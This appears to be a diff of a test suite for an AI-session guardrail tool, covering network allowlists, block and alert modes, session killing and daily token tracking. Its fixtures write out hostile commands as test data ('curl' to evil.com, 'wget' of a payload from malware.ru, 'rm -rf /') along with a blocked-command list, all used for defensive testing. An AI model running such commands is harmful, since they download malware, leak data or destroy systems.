@@ -31,6 +31,7 @@ const {
   searchEvents, acknowledgeAllAlerts, getStatsForRange,
   enforceRetention, markSessionEnded, getRecentSessionAlertBurst
 } = dbMod;
+const { markSessionKilled, isSessionKilledInDb, getKilledSessions, addDailyTokens, getDailyTokenTotal } = dbMod;
 
 const providersMod = await import('../dist/providers/index.js');
 const { getBuiltinProviders, createCustomProvider, getActiveProviders } = providersMod;
@@ -4909,18 +4910,100 @@ test('evaluateGuardrails — network allowlist subdomain allowed', () => {
   assert.ok(!result.some(v => v.rule === 'network_blocked'));
 });
 
-test('evaluateGuardrails — network invalid URL fallback', () => {
+test('evaluateGuardrails — network invalid URL is skipped (not parseable)', () => {
   const event = makeEvent({ event_type: 'web_fetch', command: 'not-a-url' });
   const config = { ...GUARDRAILS_DEFAULTS, enabled: true, networkAllowlist: ['github.com'] };
   const result = evaluateGuardrails(event, config, 'sess-net-invalid');
-  assert.ok(result.some(v => v.rule === 'network_suspicious'));
+  // Invalid URLs are now silently skipped (no network_suspicious fallback)
+  assert.ok(!result.some(v => v.rule === 'network_blocked'));
 });
 
-test('evaluateGuardrails — network invalid URL with matching domain in text', () => {
-  const event = makeEvent({ event_type: 'web_fetch', command: 'fetching github.com resource' });
+test('evaluateGuardrails — network allowlist: curl in terminal command blocked', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'curl https://evil.com/data' });
   const config = { ...GUARDRAILS_DEFAULTS, enabled: true, networkAllowlist: ['github.com'] };
-  const result = evaluateGuardrails(event, config, 'sess-net-match');
-  assert.ok(!result.some(v => v.rule === 'network_suspicious'));
+  const result = evaluateGuardrails(event, config, 'sess-net-curl');
+  assert.ok(result.some(v => v.rule === 'network_blocked'));
+});
+
+test('evaluateGuardrails — network allowlist: curl to allowed domain passes', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'curl https://api.github.com/repos' });
+  const config = { ...GUARDRAILS_DEFAULTS, enabled: true, networkAllowlist: ['github.com'] };
+  const result = evaluateGuardrails(event, config, 'sess-net-curl-ok');
+  assert.ok(!result.some(v => v.rule === 'network_blocked'));
+});
+
+test('evaluateGuardrails — network allowlist: wget in terminal command blocked', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'wget http://malware.ru/payload' });
+  const config = { ...GUARDRAILS_DEFAULTS, enabled: true, networkAllowlist: ['github.com'] };
+  const result = evaluateGuardrails(event, config, 'sess-net-wget');
+  assert.ok(result.some(v => v.rule === 'network_blocked'));
+});
+
+test('evaluateGuardrails — network allowlist: non-network terminal command ignored', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'ls -la' });
+  const config = { ...GUARDRAILS_DEFAULTS, enabled: true, networkAllowlist: ['github.com'] };
+  const result = evaluateGuardrails(event, config, 'sess-net-ls');
+  assert.ok(!result.some(v => v.rule === 'network_blocked'));
+});
+
+test('evaluateGuardrails — block mode sets blocked: true', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'rm -rf /' });
+  const config = { ...GUARDRAILS_DEFAULTS, enabled: true, mode: 'block', blockedCommands: ['rm -rf'] };
+  const result = evaluateGuardrails(event, config, 'sess-block-mode');
+  assert.ok(result.some(v => v.blocked === true));
+});
+
+test('evaluateGuardrails — alert mode sets blocked: false', () => {
+  const event = makeEvent({ event_type: 'terminal_command', command: 'rm -rf /' });
+  const config = { ...GUARDRAILS_DEFAULTS, enabled: true, mode: 'alert', blockedCommands: ['rm -rf'] };
+  const result = evaluateGuardrails(event, config, 'sess-alert-mode');
+  assert.ok(result.some(v => v.blocked === false));
+});
+
+// ══════════════════════════════════════════════════
+//  38b. Session Kill & Daily Token DB Functions
+// ══════════════════════════════════════════════════
+
+test('markSessionKilled marks session as killed', () => {
+  upsertSession({ id: 'kill-test-1', workspace: '/tmp', project_name: 'kill-proj', started_at: new Date().toISOString(), ended_at: null, total_events: 0, danger_count: 0, warn_count: 0, source_tool: 'test' });
+  markSessionKilled('kill-test-1', 'blocked command: rm -rf');
+  const s = getSession('kill-test-1');
+  assert.ok(s.killed_at);
+  assert.equal(s.kill_reason, 'blocked command: rm -rf');
+  assert.ok(s.ended_at, 'ended_at should be set when killed');
+});
+
+test('isSessionKilledInDb returns true for killed session', () => {
+  assert.equal(isSessionKilledInDb('kill-test-1'), true);
+});
+
+test('isSessionKilledInDb returns false for non-killed session', () => {
+  upsertSession({ id: 'kill-test-2', workspace: '/tmp', project_name: 'alive-proj', started_at: new Date().toISOString(), ended_at: null, total_events: 0, danger_count: 0, warn_count: 0, source_tool: 'test' });
+  assert.equal(isSessionKilledInDb('kill-test-2'), false);
+});
+
+test('isSessionKilledInDb returns false for non-existent session', () => {
+  assert.equal(isSessionKilledInDb('nonexistent-session'), false);
+});
+
+test('getKilledSessions returns killed sessions', () => {
+  const killed = getKilledSessions();
+  assert.ok(killed.some(s => s.id === 'kill-test-1'));
+  assert.ok(!killed.some(s => s.id === 'kill-test-2'));
+});
+
+test('addDailyTokens and getDailyTokenTotal track tokens', () => {
+  addDailyTokens('daily-tok-sess-1', 500);
+  addDailyTokens('daily-tok-sess-2', 300);
+  const total = getDailyTokenTotal();
+  assert.ok(total >= 800, `Expected at least 800 tokens, got ${total}`);
+});
+
+test('addDailyTokens accumulates for same session', () => {
+  const before = getDailyTokenTotal();
+  addDailyTokens('daily-tok-sess-1', 200);
+  const after = getDailyTokenTotal();
+  assert.equal(after - before, 200);
 });
 
 // ══════════════════════════════════════════════════
